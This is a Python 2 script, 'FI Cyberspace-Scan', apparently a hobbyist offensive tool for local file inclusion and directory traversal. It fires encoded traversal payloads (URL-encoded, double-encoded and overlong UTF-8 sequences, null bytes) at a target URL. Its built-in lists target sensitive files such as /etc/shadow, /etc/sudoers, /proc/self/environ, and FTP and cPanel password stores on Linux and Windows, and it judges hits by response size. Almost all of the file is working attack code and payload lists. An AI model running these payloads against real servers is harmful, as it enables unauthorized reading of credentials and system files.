#!/usr/bin/env python
import requests
import sys
import getopt

# Colors
class bco:
    BEG = '\033[96m'
    VIO = '\033[33m'
    BLU = '\033[94m'
    GRN = '\033[92m'
    YEL = '\033[93m'
    RED = '\033[91m'
    GRE = '\033[172m'
    ITA = '\033[3m'
    ENC = '\033[0m'
    
brk = "-----------------------------------------------------------------"

# Help / Usage Menu
hep = \
"-----------------------------"+bco.BEG+"Usage"+bco.ENC+"-------------------------------\n"\
+bco.BLU+"Target URL:            "+bco.RED+"-t --target\n"+bco.ENC+\
"   Set the full HTTP Path/URI in which you'd like to test.\n"\
"   LFI string will be appended to whatever you set as this argument.\n\n"\
+bco.BLU+"Cyber-Attack Modes:    "+bco.RED+"-m --mode  \n"+bco.ENC+\
bco.RED+"   3: "+bco.BEG+"ICE-Breaker "+bco.ENC+"           Hardwired LFI Validator with Custom Encoded path types. Deepspace & %00 Disabled.\n"\
+bco.RED+"   2: "+bco.BEG+"Mole-IX "+bco.ENC+"               Intermediate attack list for even the best Cyberspace Operators.\n"\
+bco.RED+"   3: "+bco.BEG+"Kuang-Grade-Mark-11 "+bco.ENC+"   Top notch verbose attack. Fires off a large list of interesting files.\n"\
+bco.RED+"   4: "+bco.BEG+"WIN-Construct "+bco.ENC+"         Targeted Windows OS attack. Includes common Windows file list.\n\n"\
+bco.BLU+"Path Type:            "+bco.RED+" -p --path \n"+bco.ENC+\
"   Set the directory traversal path type if it's encoded.\n"\
"   Set as ONE instance in single quotes ('..%2f' , '..\\\\' , '%%32%65' ,etc) \n"\
"   Deafult is set to: ../ \n\n"\
+bco.BLU+"Deep Space Traversal:  "+bco.RED+"-d --deepspace"+bco.ENC+" \n"\
"   Traverse deep within the filesystem at 9 directories deep.\n"\
"   Without this flag set, the default 5 deep will run.\n"\
"   Boolean flag. Default is FALSE.\n\n"\
+bco.BLU+"Null-Byte:             "+bco.RED+"-n --nullbyte"+bco.ENC+" \n"\
"   Appends a null-byte %00 to every request.\n"\
"   Boolean flag. Default is FALSE.\n\n"\
+bco.BLU+"Examples:\n"\
+bco.BEG+"root@case:/#"+bco.ENC+"./fi-cyber-scan.py -t http://127.0.0.1/cyber.php?=\n"\
+bco.BEG+"root@case:/#"+bco.ENC+"./fi-cyber-scan.py -t http://127.0.0.1/cyber.php?= -m ICE-Breaker \n"\
+bco.BEG+"root@case:/#"+bco.ENC+"./fi-cyber-scan.py -t http://127.0.0.1/cyber.php?= -m 4 -p '..252f' -n \n"\
+bco.BEG+"root@case:/#"+bco.ENC+"./fi-cyber-scan.py -t http://127.0.0.1/cyber.php?= -m kuang-grade-mark-11 -d\n"\
+brk


header = \
"  .    _     *      "+bco.YEL+" \|/"+bco.ENC+"   .       .      -"+bco.YEL+"*"+bco.ENC+"-               +\n"\
"    .' \\\\`.     +    "+bco.YEL+"-*-"+bco.ENC+"     *   .         '       .   "+bco.BEG+"*\n"\
" "+bco.YEL+"*"+bco.ENC+"  |__''_|  .       "+bco.YEL+"/|\\"+bco.ENC+"  "+bco.BEG+"FI Cyberspace-Scan"+bco.ENC+" '   .       |\n"\
"    |     | .                                        .     "+bco.YEL+"-*-"+bco.ENC+"\n"\
"    |     |           `  .    "+bco.YEL+"'"+bco.ENC+"             ."+bco.YEL+" *"+bco.ENC+"   .    +   "+bco.YEL+" '\n"\
+bco.GRE+"  _."+bco.ENC+"'-----'"+bco.GRE+"-._     "+bco.BEG+"*                  .\n"\
+bco.GRE+"/              \__.__.--._______________"+bco.ENC


header1 = \
"'___ "+bco.RED+"*"+bco.ENC+"  .   "+bco.BEG+" '"+bco.ENC+"   "+bco.YEL+"\|/"+bco.ENC+"     *   .   '      "+bco.YEL+"+"+bco.ENC+" .----. .  '  -"+bco.YEL+"*"+bco.ENC+"-    \n"\
"|===|     ' __   "+bco.YEL+"-*-"+bco.BEG+"  FI Cyberspace-Scan"+bco.ENC+"  ||'''|_       ' ___ \n"\
"|= =|__"+bco.YEL+"'"+bco.ENC+"  _|==|_ "+bco.YEL+"/|\\"+bco.ENC+"  ___     * .   __   _||= =|.|"+bco.BEG+" *"+bco.ENC+"   __|===|\n"\
"|= =|::| |.|:|==|____|= =| .   ____|==| |::|= =|.|__ '|::|= =|\n"\
"|=|=|::|_|.|:|==| :: |_.-`-.__|----|==|_|::|=|=|.|::|_|::|= =|"\


def confirm():
    prompt = "Execute Cyberspace Run? [Y/n]: "
    val = raw_input(prompt)
    val = val.lower()
    
    if val in ['n','no']:
        print bco.BLU+brk
        print bco.RED+"ENDING APPLICATION"+bco.ENC
        print bco.ITA+"Sponsored by: "+bco.BEG+" Hosaka Ono Sendai CYBERSPACE 7 - \"Break the ICE\""
        print bco.BLU+brk+bco.ENC
        exit(1)
    else:
        print ""


def settings():

    global path
    global deepspace
    global target
    global mode
    global nullbyte

    # Defaults set here.
    path = '../'
    deepspace = False
    target = 'http://127.0.0.1'
    mode = 'Mole-IX'
    nullbyte = False


    # getopt starts.
    options, remainder = getopt.getopt(sys.argv[1:], 't:dm:p:nh', ['target=','deepspace','mode=','path=','nullbyte=','help'])

    for opt, arg in options:
        if opt in ('-t', '--target'):
            target = arg
        elif opt in ('-m', '--mode'):
            imode = arg
            tmode = imode.lower()
            if tmode not in ['1','2','3','4','kuang-grade-mark-11','ice-breaker','mole-ix','win-construct']:
                print bco.BLU+brk
                print "Invalid Cyber-Attack Mode. Set as Number (1-4) or Mode Name. Exiting..."
                print bco.BLU+brk
                exit(1)
            elif tmode in ("1", "ice-breaker"):
                mode = "ICE-Breaker"
                path = "Custom Encoded" 
            elif tmode in ("2","mole-ix"):
                mode = "Mole-IX"
            elif tmode in ("3","kuang-grade-mark-11"):
                mode = "Kuang-Grade-Mark-11"
            elif tmode in ("4","win-construct"):
                mode = "WIN-Construct"
                path = '..\\'
            else:
                exit(1)
        elif opt in ('-d', '--deepspace'):
            deepspace = True
            if mode in 'ICE-Breaker':
                deepspace = False
        elif opt in ('-p', '--path'):
            path = arg
            if mode in 'ICE-Breaker':
                path = 'Custom Encoded'
        elif opt in ('-n', '--nullbyte'):
            nullbyte = True
            if mode in 'ICE-Breaker':
                nullbyte = False
        elif opt in ('-h', '--help'):
            print hep
            exit(1)
    print bco.BLU+brk+bco.ENC
    print header1 
    print bco.BLU+"-----------------------Hardwired Options-------------------------"
    print bco.BEG+'TARGET URL                   '+bco.ENC+':', target
    print bco.BEG+'CYBER ATTACK MODE            '+bco.ENC+':', mode
    print bco.BEG+'PATH TYPE                    '+bco.ENC+':', path
    print bco.BEG+'DEEP SPACE TRAVERSAL         '+bco.ENC+':', deepspace
    print bco.BEG+'NULL-BYTE %00                '+bco.ENC+':', nullbyte
    print bco.BLU+brk
    print bco.RED+"DO NOT USE AGAINST UNAUTHORIZED INTRUSION COUNTERMEASURE ELECTRONICS"+bco.ENC


def executioner():
  beval = 0
  
  # Reflected byte size of this req is the baseline size.
  # Anything of different reflected size will be considered a valid hit.
  tfuzz = target + "randomStringToEvaluateRefelection"

  tmp_beval = requests.get(tfuzz)
  tmp_code = tmp_beval.status_code
  if str(tmp_code).startswith('2'):
    beval = len(tmp_beval.content)
    print bco.BLU+brk
    print bco.BLU + "It seems "+bco.BEG,beval,bco.BLU+" is the common reflected byte size."
    print bco.BLU + "Digging into unique reflection sizes."
    print bco.BLU+brk
  else:
    print bco.BLU+brk
    print bco.BLU + "It seems the URL is responding with a "+bco.BEG+"Non-HTTP 200"+bco.BLU+" status when fuzzed."
    print "Any reflection should be documented as a finding."
    print bco.BLU+brk
   

  for i in modelist:
      nlb = ""
      m = 0
      tcode = 0
      if nullbyte is True:
        nlb = '%00'
        
      for s in ko:
         vas = target + s + i + nlb
         req = requests.get(vas)
         
         scode = req.status_code 
         tmode = 0
         if str(scode).startswith('2'):
            tmode = tmode + 1
            
         k = len(req.content)
         m = k + m
      
      if tmode < 1:
        print bco.RED + "[-] - Nothing found in " + i + bco.ENC
      elif (mode in 'ICE-Breaker'):
        # This number has to equal number of records in ICE list.
        if m / 121 == k:
            print bco.RED + "[-] - Nothing found in " + i + bco.ENC
        else:
            print bco.BEG + "[+] - Something interesting found with "+ i +bco.BEG+" in "+bco.ENC
            for j in ko:
              jas = target + j + i
              xeq = requests.get(jas)
              x = len(xeq.content)
              if x != k:
                print bco.BEG + "     --Path: "+bco.ENC ,j,bco.GRN + "bytes:"+bco.ENC,x

      elif (m / 5 == k and deepspace != True):
        print bco.RED + "[-] - Nothing found in " + i + bco.ENC
      elif (m / 9 == k and deepspace == True):
        print bco.RED + "[-] - Nothing found in " + i + bco.ENC
      else:
        print bco.BEG + "[+]"+bco.BEG+" - Something interesting found with "+bco.ENC+ i +bco.BEG+" in "+bco.ENC
        for j in ko:
            jas = target + j + i
            xeq = requests.get(jas)
            x = len(xeq.content)
            if deepspace is True and x != beval:
                 print bco.BEG + "     --Path: "+bco.ENC ,j
            if deepspace is False and x != beval:
                 print bco.BEG + "     --Path: "+bco.ENC ,j
   

def main():
 
  global modelist
  global ko

  tars = len(sys.argv)  
  if tars == 1:
    print "---------------------"+bco.BLU+"FI Cyberspace-Scan"+bco.ENC+"--------------------------"
    print hep
    exit(1)

  settings()
  confirm()


################################
###### Cyber-Attack Modes ######
################################

  # WINDOWS-Construct        
  dmode = ["php://input","C:\\boot.ini","C:\\WINDOWS\\win.ini","C:\\WINDOWS\\php.ini","C:\\WINNT\\php.ini","xampp\\phpMyAdmin\\config.inc",\
            "xampp\\phpMyAdmin\\phpinfo.php","xampp\\phpmyadmin\\config.inc","xampp\\phpmyadmin\\phpinfo.php","xampp\\phpmyadmin\config.inc.php",\
            "xampp\\phpMyAdmin\\config.inc.php","xampp\\apache\\conf\\httpd.conf","xampp\\FileZillaFTP\\FileZilla Server.xml",\
            "xampp\\MercuryMail\\mercury.ini","mysql\\bin\\my.ini","xampp\\php\\php.ini","xampp\\phpMyAdmin\\config.inc.php",\
            "xampp\\tomcat\\conf\\tomcat-users.xml","xampp\\tomcat\\conf\\web.xml","xampp\\sendmail\\sendmail.ini","xampp\\webalizer\\webalizer.conf",\
            "xampp\\webdav\\webdav.txt","xampp\\apache\\logs\\error.log","xampp\\apache\\logs\\access.log","xampp\\FileZillaFTP\\Logs",\
            "xampp\\FileZillaFTP\\Logs\\error.log","xampp\\FileZillaFTP\\Logs\\access.log","xampp\\MercuryMail\\LOGS\\error.log",\
            "xampp\\MercuryMail\\LOGS\\access.log","xampp\\mysql\\data\\mysql.err","xampp\\sendmail\\sendmail.log","apache\\log\\error.log",\
            "apache\\log\\access.log","apache\\log\\error_log","apache\\log\\access_log","apache2\\log\\error.log","apache2\\log\\access.log",\
            "apache2\\log\\error_log","apache2\\log\\access_log","log\\error.log","log\\access.log","log\\error_log","log\\access_log",\
            "apache\\logs\\error.log","apache\\logs\\access.log","apache\\logs\\error_log","apache\\logs\\access_log","apache2\\logs\\error.log",\
            "apache2\\logs\\access.log","apache2\\logs\\error_log","apache2\\logs\\access_log","logs\\error.log","logs\\access.log",\
            "logs\\error_log","logs\\access_log","log\\httpd\\access_log","log\\httpd\\error_log","logs\\httpd\\access_log","logs\\httpd\\error_log",\
            "opt\\xampp\\logs\\access_log","opt\\xampp\\logs\\error_log","opt\\xampp\\logs\\access.log","opt\\xampp\\logs\\error.log",\
            "Program Files\\Apache Group\\Apache\\logs\\access.log","Program Files\\Apache Group\\Apache\\logs\\error.log",\
            "Program Files\\Apache Group\\Apache\\conf\\httpd.conf","Program Files\\Apache Group\\Apache2\\conf\\httpd.conf",\
            "Program Files\\xampp\\apache\\conf\\httpd.conf"]

  # ICE-Breaker -- Adding another entry here? Make sure to increment number above.
  cmode = ["etc/passwd","etc/passwd%00","etc%2fpasswd","etc%2fpasswd%00","etc%5cpasswd","etc%5cpasswd%00",\
            "etc%c0%afpasswd","etc%c0%afpasswd%00","C:\\boot.ini","C:\\WINDOWS\\win.ini"]

  # Mole-IX
  bmode = ["etc/ook","etc/issue","etc/motd","etc/passwd","etc/shadow","etc/group","var/log/messages","var/log/mail.log","var/log/maillog","var/log/apache2/access.log",\
        "var/log/apache2/error.log","var/log/httpd/access_log","var/log/httpd/error_log","var/log/redis/redis-server.log",\
        "var/log/postgresql/postgresql-9.6-mail.log","proc/self/environ","etc/mysql/my.cnf","etc/my.cnf","var/log/exim_mainlog",\
        "var/log/mysql.log","var/log/dovecot.debug","proc/self/cmdline","proc/self/stat","proc/self/status","opt/apache2/conf/httpd.conf",\
        "etc/security/group","etc/security/passwd","etc/security/user","etc/security/environ","etc/security/limits","var/log/secure",\
        "var/log/exim_mainlog","etc/pure-ftpd.conf","etc/pureftpd.passwd","etc/dovecot/dovecot.passwd","var/log/vsftpd.log",\
        "etc/php5/apache2/php.ini","private/etc/httpd/httpd.conf","etc/crontab","etc/fstab","etc/sudoers","etc/netconfig","var/log/samba/log.smbd",\
        "var/log/smtpd","var/log/syslog","var/log/spooler","var/log/qmail","var/log/telnetd","var/log/news","var/log/cron.log",\
        "var/log/couchdb/couch.log","var/log/nginx/access.log","var/log/postgresql/postgresql-10-main.log",
        ]

  # Kuang-Grade-Mark-11
  amode = ["/var/log/messages","var/log/mail.log","var/log/mail","var/log/apache2/access.log","var/log/postgresql/postgresql-10-main.log",\
        "var/log/apache2/error.log","var/log/httpd/access_log","var/log/httpd/error.log","proc/self/cmdline","proc/self/stat",\
        "var/log/apache2/error_log","var/log/httpd/access.log","etc/httpd/logs/access.log","etc/httpd/logs/access_log",\
        "etc/httpd/logs/error_log","etc/httpd/logs/error.log","logs/error.log","logs/access.log",\
        "logs/error_log","logs/access_log","usr/local/apache/logs/access_log","usr/local/apache/logs/access.log",\
        "usr/local/apache/logs/error_log","usr/local/apache/logs/error.log","usr/local/apache2/logs/access_log",\
        "usr/local/apache2/logs/access.log","usr/local/apache2/logs/error_log","usr/local/apache2/logs/error.log",\
        "var/log/access_log","var/log/access.log","var/log/error_log","var/log/error.log",\
        "var/log/apache/access_log","var/log/apache/error.log","var/log/apache2/access_log",\
        "var/log/httpd/error_log","var/www/logs/error_log","var/www/logs/error.log","var/www/logs/access_log",\
        "var/www/logs/access.log","var/www/mgr/logs/error_log","var/www/mgr/logs/error.log",\
        "var/www/mgr/logs/access_log","var/www/mgr/logs/access.log","opt/lampp/logs/access_log",\
        "opt/lampp/logs/access.log","opt/lampp/logs/error_log","opt/lampp/logs/error.log",\
        "opt/xampp/logs/access_log","opt/xampp/logs/access.log","opt/xampp/logs/error_log","opt/xampp/logs/error.log"\
        "var/log/postgresql/postgresql-9.6-mail.log","var/log/redis/redis-server.log","etc/issue","etc/motd",\
        "etc/passwd","etc/shadow","etc/group","etc/security/group","etc/security/passwd","etc/security/user","etc/security/environ",\
        "etc/security/limits","usr/lib/security/mkuser.default","apache/logs/error.log","apache/logs/access.log","etc/httpd/logs/access.log",\
        "Program Files\\Apache Group\\Apache\\logs\\access.log","Program Files\\Apache Group\\Apache\\logs\\error.log",\
        "usr/local/apache2/conf/httpd.conf","etc/httpd/conf/httpd.conf","usr/local/etc/apache/conf/httpd.conf",\
        "usr/local/apache/conf/httpd.conf","usr/local/apache2/conf/httpd.conf","usr/local/apache/httpd.conf",\
        "usr/local/apache2/httpd.conf","usr/local/httpd/conf/httpd.conf","usr/local/etc/apache/conf/httpd.conf","usr/local/etc/apache2/conf/httpd.conf",\
        "usr/local/etc/httpd/conf/httpd.conf","usr/apache2/conf/httpd.conf","usr/apache/conf/httpd.conf","usr/local/apps/apache2/conf/httpd.conf",\
        "usr/local/apps/apache/conf/httpd.conf","etc/apache/conf/httpd.conf","etc/apache2/conf/httpd.conf","etc/httpd/conf/httpd.conf",\
        "etc/http/conf/httpd.conf","etc/apache2/httpd.conf","etc/httpd/httpd.conf","etc/http/httpd.conf","etc/httpd.conf","opt/apache/conf/httpd.conf",\
        "opt/apache2/conf/httpd.conf","var/www/conf/httpd.conf","private/etc/httpd/httpd.conf","private/etc/httpd/httpd.conf.default",\
        "Volumes/webBackup/opt/apache2/conf/httpd.conf","Volumes/webBackup/private/etc/httpd/httpd.conf","Volumes/webBackup/private/etc/httpd/httpd.conf.default",\
        "Program Files\\Apache Group\\Apache\\conf\\httpd.conf","Program Files\\Apache Group\\Apache2\\conf\\httpd.conf",\
        "Program Files\\xampp\\apache\\conf\\httpd.conf","usr/local/php/httpd.conf.php","usr/local/php4/httpd.conf.php","usr/local/php5/httpd.conf.php",\
        "usr/local/php/httpd.conf","usr/local/php4/httpd.conf","usr/local/php5/httpd.conf","Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf",\
        "Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf","Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf","Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php",\
        "Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php","Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php","usr/local/etc/apache/vhosts.conf",\
        "etc/php.ini","bin/php.ini","etc/httpd/php.ini","usr/lib/php.ini","usr/lib/php/php.ini","usr/local/etc/php.ini","usr/local/lib/php.ini",\
        "usr/local/php/lib/php.ini","usr/local/php4/lib/php.ini","usr/local/php5/lib/php.ini","usr/local/apache/conf/php.ini","etc/php4.4/fcgi/php.ini",\
        "etc/php4/apache/php.ini","etc/php4/apache2/php.ini","etc/php5/apache/php.ini","etc/php5/apache2/php.ini","etc/php/php.ini","etc/php/php4/php.ini",\
        "etc/php/apache/php.ini","etc/php/apache2/php.ini","web/conf/php.ini","usr/local/Zend/etc/php.ini","opt/xampp/etc/php.ini","var/local/www/conf/php.ini",\
        "etc/php/cgi/php.ini","etc/php4/cgi/php.ini","etc/php5/cgi/php.ini","php5\\php.ini","php4\\php.ini","php\\php.ini","PHP\\php.ini","WINDOWS\\php.ini",\
        "WINNT\\php.ini","apache\\php\\php.ini","xampp\\apache\\bin\\php.ini","NetServer\\bin\\stable\\apache\\php.ini","home2\\bin\\stable\\apache\\php.ini",\
        "home\\bin\stable\\apache\\php.ini","Volumes/Macintosh_HD1/usr/local/php/lib/php.ini","usr/local/cpanel/logs","usr/local/cpanel/logs/stats_log",\
        "usr/local/cpanel/logs/access_log","usr/local/cpanel/logs/error_log","usr/local/cpanel/logs/license_log","usr/local/cpanel/logs/login_log",\
        "usr/local/cpanel/logs/stats_log","var/cpanel/cpanel.config","var/log/mysql/mysql-bin.log","var/log/mysql.log","var/log/mysqlderror.log",\
        "var/log/mysql/mysql.log","var/log/mysql/mysql-slow.log","var/mysql.log","var/lib/mysql/my.cnf","etc/mysql/my.cnf","etc/my.cnf","etc/logrotate.d/proftpd",\
        "www/logs/proftpd.system.log","var/log/proftpd","etc/proftp.conf","etc/protpd/proftpd.conf","etc/vhcs2/proftpd/proftpd.conf","etc/proftpd/modules.conf",\
        "var/log/vsftpd.log","etc/vsftpd.chroot_list","etc/logrotate.d/vsftpd.log","etc/vsftpd/vsftpd.conf","etc/vsftpd.conf","etc/chrootUsers",\
        "var/log/xferlog","var/adm/log/xferlog","etc/wu-ftpd/ftpaccess","etc/wu-ftpd/ftphosts","etc/wu-ftpd/ftpusers","usr/sbin/pure-config.pl",\
        "usr/etc/pure-ftpd.conf","etc/pure-ftpd/pure-ftpd.conf","usr/local/etc/pure-ftpd.conf","usr/local/etc/pureftpd.pdb","usr/local/pureftpd/etc/pureftpd.pdb",\
        "usr/local/pureftpd/sbin/pure-config.pl","usr/local/pureftpd/etc/pure-ftpd.conf","etc/pure-ftpd.conf","etc/pure-ftpd/pure-ftpd.pdb","etc/pureftpd.pdb",\
        "etc/pureftpd.passwd","etc/pure-ftpd/pureftpd.pdb","usr/ports/ftp/pure-ftpd/","usr/ports/net/pure-ftpd/","usr/pkgsrc/net/pureftpd/",\
        "usr/ports/contrib/pure-ftpd/","var/log/pure-ftpd/pure-ftpd.log","logs/pure-ftpd.log","var/log/pureftpd.log","var/log/ftp-proxy/ftp-proxy.log",\
        "var/log/ftp-proxy","var/log/ftplog","etc/logrotate.d/ftp","etc/ftpchroot","etc/ftphosts","var/log/exim_mainlog","var/log/exim/mainlog",\
        "var/log/maillog","var/log/exim_paniclog","var/log/exim/paniclog","var/log/exim/rejectlog","var/log/exim_rejectlog","etc/dovecot/dovecot.passwd"\
        "etc/crontab","etc/fstab","etc/sudoers","etc/netconfig","var/log/samba/log.smbd","var/log/exim4/mainlog","var/log/exim4/paniclog","var/log/exim4_mainlog"\
        "var/log/smtpd","var/log/syslog","var/log/spooler","var/log/qmail","var/log/telnetd","var/log/news","var/log/cron.log",\
        "var/log/couchdb/couch.log","var/log/nginx/access.log",\
        "proc/self/cmdline","proc/self/stat","proc/self/status","proc/self/fd/0","proc/self/fd/1","proc/self/fd/2","proc/self/fd/3","proc/self/fd/4",\
        "proc/self/fd/5","proc/self/fd/6","proc/self/fd/7","proc/self/fd/8","proc/self/fd/9","proc/self/fd/10","proc/self/fd/11","proc/self/fd/12",\
        "proc/self/fd/13","proc/self/fd/14","proc/self/fd/15","proc/self/fd/16","proc/self/fd/17","proc/self/fd/18","proc/self/fd/19","proc/self/fd/20",\
        "proc/self/fd/21","proc/self/fd/22","proc/self/fd/23","proc/self/fd/24","proc/self/fd/25","proc/self/fd/26","proc/self/fd/27","proc/self/fd/28",\
        "proc/self/fd/29","proc/self/fd/30","proc/self/fd/31","proc/self/fd/32","proc/self/fd/33","proc/self/fd/34","proc/self/fd/35","proc/self/fd/36"]
    

  ###################################################
  ################ PATH PATTERNS ####################
  ###################################################
  #ko = ["/","../","../../","../../../","../../../../"]
  basic = ["/",path,path*2,path*3,path*4]
  deep = ["/",path,path*2,path*3,path*4,path*5,path*6,path*7,path*8]
  ice = ["/","../","../../","../../../","../../../../","\\","..\\","..\\..\\","..\\..\\..\\","..\\..\\..\\..\\..\\"\
          "%2e%2e%2f","%2e%2e%2f"*2,"*%2e%2e%2f"*3,"%2e%2e%2f"*4,"%2e%2e%2f"*5,"%2e%2e%2f"*6,"%2e%2e%2f"*7,"%2e%2e%2f"*8,\
         "%2e%2e/","%2e%2e/"*2,"%2e%2e/"*3,"%2e%2e/"*4,"%2e%2e/"*5,"%2e%2e/"*6,"%2e%2e/"*7,"%2e%2e/"*8,\
         "..%2f","..%2f"*2,"..%2f"*3,"..%2f"*4,"..%2f"*5,"..%2f"*6,"..%2f"*7,"..%2f"*8,\
         "%252e%252e%252f","%252e%252e%252f"*2,"%252e%252e%252f"*3,"%252e%252e%252f"*4,"%252e%252e%252f"*5,"%252e%252e%252f"*6,\
         "%252e%252e%252f"*7,"%252e%252e%252f"*8,\
         "%252e%252e/","%252e%252e/"*2,"%252e%252e/"*3,"%252e%252e/"*4,"%252e%252e/"*5,"%252e%252e/"*6,"%252e%252e/"*7,"%252e%252e/"*8,\
         "..%252f","..%252f"*2,"..%252f"*3,"..%252f"*4,"..%252f"*5,"..%252f"*6,"..%252f"*7,"..%252f"*8,\
         "%2e%2e%5c","%2e%2e%5c"*2,"%2e%2e%5c"*3,"%2e%2e%5c"*4,"%2e%2e%5c"*5,"%2e%2e%5c"*6,"%2e%2e%5c"*7,"%2e%2e%5c"*8,\
         "%2e%2e\\","%2e%2e\\"*2,"%2e%2e\\"*3,"%2e%2e\\"*4,"%2e%2e\\"*5,"%2e%2e\\"*6,"%2e%2e\\"*7,"%2e%2e\\"*8,\
         "..%5c","..%5c"*2,"..%5c"*3,"..%5c"*4,"..%5c"*5,"..%5c"*6,"..%5c"*7,"..%5c"*8,\
         "%252e%252e%255c","%252e%252e%255c"*2,"%252e%252e%255c"*2,"%252e%252e%255c"*2,"%252e%252e%255c"*2,"%252e%252e%255c"*2,\
         "%252e%252e%255c"*2,"%252e%252e%255c"*2,\
         "%252e%252e\\","%252e%252e\\"*2,"%252e%252e\\"*3,"%252e%252e\\"*4,"%252e%252e\\"*5,"%252e%252e\\"*6,"%252e%252e\\"*7,"%252e%252e\\"*8,\
         "..%255c","..%255c"*2,"..%255c"*3,"..%255c"*4,"..%255c"*5,"..%255c"*6,"..%255c"*7,"..%255c"*8,\
         "..%c0%af","..%c0%af"*2,"..%c0%af"*3,"..%c0%af"*4,"..%c0%af"*5,"..%c0%af"*6,"..%c0%af"*7,"..%c0%af"*8,\
         "..%c1%9c","..%c1%9c"*2,"..%c1%9c"*2,"..%c1%9c"*2,"..%c1%9c"*2,"..%c1%9c"*2,"..%c1%9c"*2,"..%c1%9c"*2]

  # Continue main()
  if deepspace is True:
    ko = deep
  elif path == 'Custom Encoded':
    ko = ice
  else:
    ko = basic

  if mode in 'Kuang-Grade-Mark-11':
    modelist = amode
  elif mode in "Mole-IX":
    modelist = bmode
  elif mode in "ICE-Breaker":
      modelist = cmode
  elif mode in "WIN-Construct":
      modelist = dmode
  else:
      modelist = bmode
  
  executioner()

  print bco.BLU+brk
  print bco.ENC+"Cyber Run Status:     "+bco.GRN+" COMPLETE"+bco.ENC
  print bco.BLU+brk+bco.ENC


if __name__ == '__main__':
  main()
